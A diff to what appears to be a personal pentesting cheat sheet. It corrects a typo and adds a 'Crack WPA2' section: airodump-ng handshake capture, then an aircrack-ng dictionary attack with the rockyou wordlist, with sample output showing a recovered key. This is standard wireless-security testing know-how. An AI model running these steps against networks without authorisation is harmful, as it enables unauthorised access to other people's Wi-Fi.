@@ -71,8 +71,8 @@ CH  6 ][ Elapsed: 18 s ][ 2020-03-16 20:58
  16:59:C0:XX:XX:XX  -16        5        0    0   4  195  WPA2 CCMP   PSK  NETGEAR-Guest
 ```
 
-Capture Handshark   
-`airodump-ng -c 4 -d 16:59:C0:XX:XX:XX -w savefile.pcap wlan0mon`   
+Capture Handshake   
+`airodump-ng -c 4 -d 16:59:C0:XX:XX:XX -w savefile wlan0mon`   
 
 ```bash
  CH  4 ][ Elapsed: 18 s ][ 2020-03-16 21:08 ][ WPA handshake: 16:59:C0:95:DB:06
@@ -81,6 +81,32 @@ Capture Handshark
 
  16:59:C0:XX:XX:XX  -19  48       88        5    0   4  195  WPA2 CCMP   PSK  NETGEAR-Guest
 ```
+
+Crack WPA2   
+`aircrack-ng -w /usr/share/wordlists/rockyou.txt savefile.cap`   
+
+```bash
+
+                                 Aircrack-ng 1.2
+
+      [00:00:00] 16/7120712 keys tested (1128.27 k/s)
+
+      Time left: 1 hour, 45 minutes, 12 seconds                  0.00%
+
+                           KEY FOUND! [ XXXXXXXX ]
+
+
+      Master Key     : FD 3F 34 FD 32 6F 4D 16 DB 9B DA 5B B6 47 58 63
+                       94 48 19 58 A5 42 E5 85 4F 3D CB BC 11 79 C9 74
+
+      Transient Key  : 83 0F D3 B8 20 0C 22 AD 61 2D CD 1D 9E 40 05 AF
+                       D6 EC CE 53 E7 0E D0 5D DA 23 46 BF 56 C0 0A 10
+                       A3 47 7E 7B 32 9D 0D 61 62 1F D2 82 76 9F 55 29
+                       F9 E1 E2 7C 59 85 4F C8 E5 4D F1 B9 8C 9D 00 A6
+
+      EAPOL HMAC     : E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
+```
+
 
 #### Wireshark
 
